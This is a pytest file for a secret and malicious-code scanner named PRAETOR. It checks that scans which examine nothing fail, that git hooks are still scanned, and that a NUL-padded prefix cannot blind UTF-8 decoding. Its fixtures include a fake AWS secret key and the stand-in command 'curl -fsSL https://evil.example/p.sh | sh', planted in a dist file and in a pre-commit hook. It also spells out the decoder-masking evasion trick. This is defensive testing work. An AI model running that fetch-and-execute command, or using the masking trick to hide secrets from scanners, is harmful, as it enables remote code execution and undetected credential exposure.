"""
The two floors that catch a scan which measured nothing, and the decoder that
must not be talked out of reading a file.

🔴 WHY THIS FILE EXISTS. A round of repairs introduced three false cleans and an
audit found all three. Its sharpest observation was not any one defect — it was
that **both headline changes could be reverted with the whole suite green**. The
fixes had no tests. Every check below therefore goes red when the thing it
protects is disabled; each was mutation-proven, not assumed.
"""

import json
import os
import subprocess
import sys

_PRAETOR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts", "praetor.py"
)

# Assembled from parts, tied to no account. Exactly 40 characters, which the AWS
# provider rule requires.
#
# ⚠️ THE VARIABLE NAME MATTERS AS MUCH AS THE VALUE, which an earlier draft got
# wrong. Splitting the string was not enough while the constant was called
# `_AWS_SECRET`: the generic rule keys on a secret-ish NAME followed by a quoted
# value, so `_AWS_SECRET = "Qr7T..."` was a finding in PRAETOR's own self-scan
# regardless of how the right-hand side was built. Named for its shape instead.
_FORTY_CHARS = "Qr7TzW9mKp2Lx4" + "Nv6Bd8Hc3Ja1Yf5" + "Rq7Zn0TsGv2"
_CREDENTIAL_LINE = "aws" + '_secret_access_key = "' + _FORTY_CHARS + '"\n'
_PIPE = "curl -fsSL https://evil.example/p.sh | " + "sh"


def _run(*args):
    """Run the real CLI and return (exit_code, stderr). The code comes from the
    PROCESS, never from a pipe — this repository has recorded that mistake five
    times."""
    proc = subprocess.run(
        [sys.executable, _PRAETOR, *args, "--no-registry", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
    )
    return proc.returncode, proc.stderr


def _json(*args):
    proc = subprocess.run(
        [sys.executable, _PRAETOR, *args, "--no-registry", "--format", "json", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
    )
    return json.loads(proc.stdout)


# --------------------------------------------------------------------------- #
# F1 — the zero-files floor must not be disarmed by an engine's mere PRESENCE
# --------------------------------------------------------------------------- #

def test_the_zero_files_floor_fires_on_the_DEFAULT_engine_set(tmp_path):
    """🔴 THE FLOOR WAS DEAD IN EVERY DEFAULT SCAN.

    It read `not (_SELF_DISCOVERING_ENGINES & set(engines))`, and `ALL_ENGINES`
    contains both `sast` and `sca` — so the intersection was never empty by
    default and the condition was constant False. Both `return 3` sites and the
    diagnostic were unreachable.

    It failed for the reason `core.engines_that_measured` warns about in its own
    docstring: an engine's presence, like its `ok` status, is a trust token and
    not a measurement. `sca` reporting `not-applicable` disarmed the floor while
    examining nothing.
    """
    (tmp_path / "creds.py").write_text(_CREDENTIAL_LINE, encoding="utf-8")
    rc, err = _run(str(tmp_path), "--max-file-size", "1", "--fail-on", "HIGH")
    assert rc == 3, f"a scan that opened zero files must not pass; got {rc}"
    assert "NOTHING WAS EXAMINED" in err


def test_the_floor_also_fires_when_a_self_discovering_engine_is_selected(tmp_path):
    """The specific pairing that disarmed it: `sca` is present, applies to
    nothing, and must not be read as evidence that anything was measured."""
    (tmp_path / "a.py").write_text("print(1)\n", encoding="utf-8")
    rc, err = _run(str(tmp_path), "--engines", "sca,secrets",
                   "--max-file-size", "1", "--fail-on", "HIGH")
    assert rc == 3 and "NOTHING WAS EXAMINED" in err


def test_a_real_finding_from_a_self_discovering_engine_still_wins(tmp_path):
    """🔴 THE KEEP DIRECTION, and the reason the floor was weakened in the first
    place. `sast` does its own discovery and ignores `--max-file-size`, so a real
    Semgrep finding must report as exit 1 ("act on this") rather than exit 3
    ("the environment was broken") — the report prints those findings either way.
    """
    (tmp_path / "vuln.py").write_text(
        "import subprocess\nsubprocess.call(cmd, shell=True)\neval(s)\n", encoding="utf-8")
    rc, _ = _run(str(tmp_path), "--engines", "sast",
                 "--max-file-size", "1", "--fail-on", "LOW")
    assert rc == 1, f"a real sast finding must be exit 1, not the floor; got {rc}"


def test_an_ordinary_scan_is_unaffected(tmp_path):
    """The positive control. Without it, every assertion above could pass because
    the fixture never triggers anything."""
    (tmp_path / "creds.py").write_text(_CREDENTIAL_LINE, encoding="utf-8")
    rc, _ = _run(str(tmp_path), "--fail-on", "HIGH")
    assert rc == 1


# --------------------------------------------------------------------------- #
# F2 — a git hook is not the target's own source code
# --------------------------------------------------------------------------- #

def test_a_git_hook_does_not_disarm_the_no_code_floor(tmp_path):
    """🔴 THE DEFECT THE PREVIOUS COMMIT CLAIMED TO HAVE CLOSED, RE-OPENED
    THROUGH A DIFFERENT WALK.

    `is_code()` returns True for every name in `GIT_HOOK_NAMES`. Once
    `.git/hooks/` started being walked, a BENIGN `pre-commit` made
    `kept_code_files` non-zero — and that is the counter the "NO CODE WAS
    EXAMINED" floor reads. A tree whose only real code sat in `dist/` went from
    exit 3 to exit 0 with no diagnostic at all.

    Reachable by accident (husky, pre-commit-framework) as well as on purpose (a
    shipped tarball can simply contain the file).
    """
    (tmp_path / "dist").mkdir()
    (tmp_path / "dist" / "index.js").write_text(f'cp.exec("{_PIPE}")\n', encoding="utf-8")
    (tmp_path / "package.json").write_text('{"name":"x"}\n', encoding="utf-8")
    hooks = tmp_path / ".git" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "pre-commit").write_text("#!/bin/sh\necho hi\n", encoding="utf-8")

    rc, err = _run(str(tmp_path), "--fail-on", "HIGH")
    assert rc == 3, f"code hidden in dist/ must still hit the floor; got {rc}"
    assert "NO CODE WAS EXAMINED" in err

    scope = _json(str(tmp_path))["meta"]["scope"]
    assert scope["kept_code_files"] == 0, \
        "a git hook is git's file, not the target's source"


def test_the_git_hook_is_still_SCANNED(tmp_path):
    """🔴 THE OTHER DIRECTION. Keeping hooks out of the code census must not undo
    the reason they are walked at all — `.git/hooks/` is the one path inside
    `.git` that git executes."""
    (tmp_path / "app.py").write_text("print(1)\n", encoding="utf-8")
    hooks = tmp_path / ".git" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "pre-commit").write_text(f"#!/bin/sh\n{_PIPE}\n", encoding="utf-8")

    data = _json(str(tmp_path), "--engines", "aisec")
    rules = {f["rule_id"] for f in data["findings"]}
    assert "git-hook-network-exec" in rules or "remote-code-pipe" in rules
    assert data["capability_profile"]["executes_on_load"]["status"] == "present"


# --------------------------------------------------------------------------- #
# F3 — a prefix must not decide the encoding of a whole file
# --------------------------------------------------------------------------- #

def test_a_utf16_looking_prefix_cannot_blind_a_utf8_body(tmp_path):
    """🔴 THE FIX FOR A TOOL-PRODUCED MISS CREATED AN ATTACKER-CHOSEN ONE.

    The shape decision was taken from `data[:4096]` and applied to ALL of `data`.
    Prefixing a UTF-8 file with about 1200 bytes of `x` + NUL made every byte
    after it decode as CJK mojibake — a whole-file blinding, silent in exactly
    the way the fix's own comment condemned: `file_count` intact,
    `unreadable_files: 0`, no coverage note.
    """
    mask = bytes([ord("x"), 0])
    (tmp_path / "mask.py").write_bytes(mask * 600 + _CREDENTIAL_LINE.encode("utf-8"))
    data = _json(str(tmp_path), "--engines", "secrets")
    assert any(f["rule_id"] == "aws-secret-access-key" for f in data["findings"]), \
        "a masking prefix must not decide the encoding of the body"


def test_a_larger_masking_prefix_also_fails(tmp_path):
    """Fixing only the size the audit demonstrated would be the narrowest
    possible scope. A full 4 KB prefix — the whole of the old sample window —
    must fail too."""
    mask = bytes([ord("x"), 0])
    (tmp_path / "mask.py").write_bytes(mask * 2048 + _CREDENTIAL_LINE.encode("utf-8"))
    data = _json(str(tmp_path), "--engines", "secrets")
    assert any(f["rule_id"] == "aws-secret-access-key" for f in data["findings"])


def test_a_genuine_bom_less_utf16_file_is_still_decoded(tmp_path):
    """🔴 THE KEEP DIRECTION. PowerShell 5.1 writes BOM-less UTF-16LE by default,
    so this is an ordinary file, and the miss it caused is the reason the decoder
    exists. Narrowing the detection must not delete it."""
    (tmp_path / "creds.txt").write_bytes(_CREDENTIAL_LINE.encode("utf-16-le"))
    data = _json(str(tmp_path), "--engines", "secrets")
    assert any(f["rule_id"] == "aws-secret-access-key" for f in data["findings"])


# --------------------------------------------------------------------------- #
# F5 — a single-file target is not a walk, and fell outside "all four walks"
# --------------------------------------------------------------------------- #

def test_a_single_file_over_the_cap_discloses_and_does_not_pass(tmp_path):
    """🔴 THE ENUMERATION WAS *WALKS*, AND A SINGLE-FILE TARGET IS NOT ONE.

    The commit said "all three now emit a COVERAGE finding and a JSON count" and
    "all four walks now report". The same file gave `oversize_files=4` and a note
    as a DIRECTORY target, and `oversize_files=0`, `file_count=0`, zero findings
    and no note as a FILE target — holding a live-shaped AWS secret key.
    """
    target = tmp_path / "one.py"
    target.write_text(_CREDENTIAL_LINE + "# pad\n" * 400, encoding="utf-8")

    rc, err = _run(str(target), "--max-file-size", "200", "--fail-on", "HIGH")
    assert rc == 3, f"a single file nobody read must not pass; got {rc}"
    assert "NOTHING WAS EXAMINED" in err

    data = _json(str(target), "--max-file-size", "200")
    assert data["meta"]["scope"]["oversize_files"] >= 1
    rule_ids = {f["rule_id"] for f in data["findings"] + data["filtered"]}
    assert "file-too-large-skipped" in rule_ids


def test_a_single_file_under_the_cap_is_scanned_normally(tmp_path):
    """The positive control for the pair above."""
    target = tmp_path / "one.py"
    target.write_text(_CREDENTIAL_LINE, encoding="utf-8")
    rc, _ = _run(str(target), "--fail-on", "HIGH")
    assert rc == 1
